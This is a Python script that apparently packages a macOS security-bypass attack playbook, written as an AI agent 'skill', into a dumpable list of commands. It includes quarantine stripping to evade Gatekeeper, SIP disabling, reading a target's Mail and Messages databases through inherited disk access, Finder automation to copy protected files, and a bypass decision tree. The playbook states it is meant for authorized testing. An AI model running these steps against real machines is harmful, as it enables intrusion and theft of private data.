#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/macos-security-bypass

Skill: SKILL: macOS Security Bypass — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-macos-security-bypass.py --help
      python hack-skills-macos-security-bypass.py --list
      python hack-skills-macos-security-bypass.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/macos-security-bypass'
TITLE = 'SKILL: macOS Security Bypass — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: macos-security-bypass", "description: >-", "macOS security bypass playbook. Use when targeting macOS endpoints and need to bypass TCC, Gatekeeper, SIP, sandbox, code signing, or entitlement-based protections during authorized red team or pentest engagements."],
    'skill-macos-security-bypass-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [macos-process-injection](../macos-process-injection/SKILL.md) when you need dylib injection, XPC exploitation, or Electron abuse after achieving initial access", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) for Unix-layer privesc techniques that also apply to macOS (SUID, cron, writable paths)", "- [linux-security-bypass](../linux-security-bypass/SKILL.md) for shared Unix security bypass concepts"],
    'advanced-reference': ["Also load [TCC_BYPASS_MATRIX.md](./TCC_BYPASS_MATRIX.md) when you need:", "- Per-macOS-version TCC bypass mapping", "- Protection-type-specific techniques (Camera, Microphone, FDA, Automation)", "- MDM/configuration profile abuse patterns"],
    '1-tcc-transparency-consent-control-overview': ["TCC is macOS's permission framework controlling access to sensitive resources (camera, microphone, contacts, full disk access, etc.)."],
    '1-1-tcc-database-locations': ["```sql", "-- Query TCC database (requires FDA or SIP off)", "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \\", "\"SELECT service, client, allowed FROM access;\""],
    '1-2-tcc-bypass-categories': [],
    '1-3-known-tcc-bypass-patterns': ["**Terminal / iTerm FDA inheritance**: Terminal.app granted FDA \u2192 any command run inherits FDA \u2192 read any file.", "```bash"],
    'if-terminal-has-fda-this-reads-protected-files-directly': ["cat ~/Library/Mail/V*/MailData/Envelope\\ Index", "cat ~/Library/Messages/chat.db", "**Finder automation**: Automate Finder (lower permission bar) to access files in protected locations.", "```applescript", "tell application \"Finder\"", "set f to POSIX file \"/Users/target/Library/Mail/V9/MailData/Envelope Index\"", "duplicate f to desktop", "end tell", "**System Preferences / System Settings injection**: Inject into a process that already has TCC permissions by writing to its Application Scripts folder.", "**MDM profile abuse**: PPPC profiles can pre-approve TCC permissions. Rogue MDM enrollment or compromised MDM server \u2192 push PPPC payload."],
    '2-gatekeeper-bypass': ["Gatekeeper blocks unsigned or unnotarized apps from executing. Core enforcement depends on the `com.apple.quarantine` extended attribute."],
    '2-1-quarantine-attribute-removal': ["```bash"],
    'check-quarantine-attribute': ["xattr -l /path/to/app"],
    'output-com-apple-quarantine-0083': [],
    'remove-quarantine-requires-write-access': ["xattr -d com.apple.quarantine /path/to/app"],
    'recursive-for-app-bundles': ["xattr -rd com.apple.quarantine /path/to/MyApp.app"],
    '2-2-bypass-techniques': [],
    '2-3-gatekeeper-check-flow': ["App launched", "\u251c\u2500\u2500 com.apple.quarantine attribute present?", "\u2502   \u251c\u2500\u2500 No \u2192 execute (no Gatekeeper check)", "\u2502   \u2514\u2500\u2500 Yes \u2193", "\u251c\u2500\u2500 Code signature valid?", "\u2502   \u251c\u2500\u2500 No \u2192 block", "\u2502   \u2514\u2500\u2500 Yes \u2193", "\u251c\u2500\u2500 Notarized (stapled ticket or online check)?", "\u2502   \u251c\u2500\u2500 No \u2192 block (Catalina+)", "\u2502   \u2514\u2500\u2500 Yes \u2192 execute", "\u2514\u2500\u2500 User override? (right-click \u2192 Open \u2192 confirm)", "\u2514\u2500\u2500 Bypasses Gatekeeper once for this app"],
    '3-sip-system-integrity-protection': ["SIP restricts root from modifying protected system locations, loading unsigned kernel extensions, and debugging system processes."],
    '3-1-sip-protected-locations': ["/System/", "/usr/ (except /usr/local/)", "/bin/", "/sbin/", "/var/ (selected subdirs)", "/Applications/ (pre-installed Apple apps)"],
    '3-2-sip-status-configuration': ["```bash", "csrutil status              # Check SIP status", "csrutil disable             # Recovery Mode only", "csrutil enable --without fs # Partial disable (risky)"],
    '3-3-entitlements-that-bypass-sip': [],
    '3-4-historical-sip-bypasses': [],
    '4-sandbox-escape': ["macOS sandboxing (App Sandbox, via `sandbox-exec` or entitlements) restricts app access to filesystem, network, and IPC."],
    '4-1-office-sandbox-escape-patterns': [],
    '4-2-ipc-based-escape': [],
    '4-3-browser-sandbox': ["- Chromium: Multi-process model, renderer is sandboxed, browser process is not", "- Safari: WebContent process sandboxed, parent Safari process has more privileges", "- Exploit chain: renderer RCE \u2192 sandbox escape (via IPC bug to browser process) \u2192 system access"],
    '5-code-signing-entitlements': [],
    '5-1-inspecting-signatures-and-entitlements': ["```bash", "codesign -dv --verbose=4 /path/to/app       # Signature details", "codesign -d --entitlements :- /path/to/app   # Dump entitlements", "security cms -D -i /path/to/mobileprovision  # Provisioning profile"],
    'verify-signature-validity': ["codesign --verify --deep --strict /path/to/app", "spctl --assess --type execute /path/to/app   # Gatekeeper assessment"],
    '5-2-entitlement-abuse-for-privilege-escalation': [],
    '5-3-hardened-runtime-bypass': ["Hardened Runtime prevents: DYLD env vars, debugging, unsigned memory execution. Bypasses:", "- Find entitled apps that weaken Hardened Runtime (`disable-library-validation`)", "- Exploit JIT-entitled apps (browsers, VMs) for unsigned code execution", "- Use `get-task-allow` entitled debug builds left in production"],
    '5-4-library-validation-bypass': ["Library validation ensures only Apple-signed or same-team-signed dylibs load.", "```bash"],
    'find-apps-with-library-validation-disabled': ["codesign -d --entitlements :- /Applications/*.app/Contents/MacOS/* 2>/dev/null | \\", "grep -l \"disable-library-validation\""],
    '6-persistence-after-bypass': [],
    '7-macos-security-bypass-decision-tree': ["Target is macOS endpoint", "\u251c\u2500\u2500 Need to execute untrusted binary?", "\u2502   \u251c\u2500\u2500 Quarantine attribute present?", "\u2502   \u2502   \u251c\u2500\u2500 Yes \u2192 xattr -d com.apple.quarantine (\u00a72.1)", "\u2502   \u2502   \u2514\u2500\u2500 No \u2192 execute directly", "\u2502   \u2514\u2500\u2500 Gatekeeper still blocks?", "\u2502       \u251c\u2500\u2500 Signed but not notarized \u2192 right-click \u2192 Open override", "\u2502       \u2514\u2500\u2500 Unsigned \u2192 embed in signed bundle or use archive tricks (\u00a72.2)", "\u251c\u2500\u2500 Need access to TCC-protected resources?", "\u2502   \u251c\u2500\u2500 FDA-granted app available?", "\u2502   \u2502   \u251c\u2500\u2500 Yes \u2192 exploit FDA app context (\u00a71.3)", "\u2502   \u2502   \u2514\u2500\u2500 No \u2193", "\u2502   \u251c\u2500\u2500 Automation permission obtainable?", "\u2502   \u2502   \u251c\u2500\u2500 Yes \u2192 Apple Events to TCC-granted app (\u00a71.3)", "\u2502   \u2502   \u2514\u2500\u2500 No \u2193", "\u2502   \u251c\u2500\u2500 SIP disabled?", "\u2502   \u2502   \u251c\u2500\u2500 Yes \u2192 direct TCC.db modification (\u00a71.2)", "\u2502   \u2502   \u2514\u2500\u2500 No \u2192 check version-specific TCC bypass (\u2192 TCC_BYPASS_MATRIX.md)", "\u2502   \u2514\u2500\u2500 MDM present?", "\u2502       \u2514\u2500\u2500 Compromised MDM \u2192 push PPPC profile (\u00a71.3)", "\u251c\u2500\u2500 Need to bypass SIP?", "\u2502   \u251c\u2500\u2500 Check macOS version \u2192 historical SIP CVE? (\u00a73.4)", "\u2502   \u251c\u2500\u2500 Find entitled Apple binary \u2192 piggyback SIP-bypass entitlement (\u00a73.3)", "\u2502   \u2514\u2500\u2500 Recovery Mode access? \u2192 csrutil disable (\u00a73.2)", "\u251c\u2500\u2500 Need sandbox escape?", "\u2502   \u251c\u2500\u2500 Office macro context \u2192 dialog/LaunchAgent tricks (\u00a74.1)", "\u2502   \u251c\u2500\u2500 XPC service with weak validation \u2192 IPC escape (\u00a74.2)", "\u2502   \u2514\u2500\u2500 Browser context \u2192 renderer \u2192 sandbox escape chain (\u00a74.3)", "\u251c\u2500\u2500 Need to inject into signed process?", "\u2502   \u251c\u2500\u2500 disable-library-validation entitlement? \u2192 dylib injection", "\u2502   \u251c\u2500\u2500 allow-dyld-environment-variables? \u2192 DYLD_INSERT_LIBRARIES", "\u2502   \u251c\u2500\u2500 get-task-allow? \u2192 debugger attach", "\u2502   \u2514\u2500\u2500 None \u2192 check macos-process-injection SKILL.md", "\u2514\u2500\u2500 Need persistence?", "\u2514\u2500\u2500 Choose method by access level (\u00a76)"],
    '8-quick-reference-tool-commands': ["```bash"],
    'enumerate-tcc-permissions': ["tccutil reset All                              # Reset all TCC (admin)", "sqlite3 TCC.db \"SELECT * FROM access;\"         # Read TCC DB"],
    'gatekeeper-status': ["spctl --status                                 # Gatekeeper enabled?", "spctl --assess -v /path/to/app                 # Check app assessment"],
    'sip-status': ["csrutil status"],
    'find-interesting-entitlements-across-system': ["find /System/Applications /Applications -name \"*.app\" -exec sh -c \\", "'codesign -d --entitlements :- \"$1\" 2>/dev/null | grep -q \"disable-library-validation\" && echo \"$1\"' _ {} \\;"],
    'list-loaded-kexts-kernel-extensions': ["kextstat | grep -v com.apple"],
    'sandbox-profile-inspection': ["sandbox-exec -p \"(version 1)(allow default)\" /bin/ls  # Test sandbox rules"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()